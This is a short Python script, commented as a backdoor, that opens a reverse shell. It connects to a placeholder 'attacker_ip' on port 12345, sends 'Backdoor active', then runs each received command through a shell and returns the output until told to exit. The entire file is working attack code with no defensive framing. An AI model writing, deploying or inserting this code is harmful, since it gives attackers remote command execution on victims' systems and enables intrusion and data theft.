import socket
import subprocess
import os

# Create a socket object
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the attacker's server
sock.connect(("attacker_ip", 12345))

# Send a message to the attacker indicating that the backdoor is active
sock.send(b"Backdoor active")

while True:
    # Receive commands from the attacker
    command = sock.recv(1024).decode()

    if command == "exit":
        # Close the connection and exit the backdoor
        sock.close()
        break

    # Execute the command and send the output to the attacker
    output = subprocess.check_output(command, shell=True)
    sock.send(output)

# Close the socket object
sock.close()
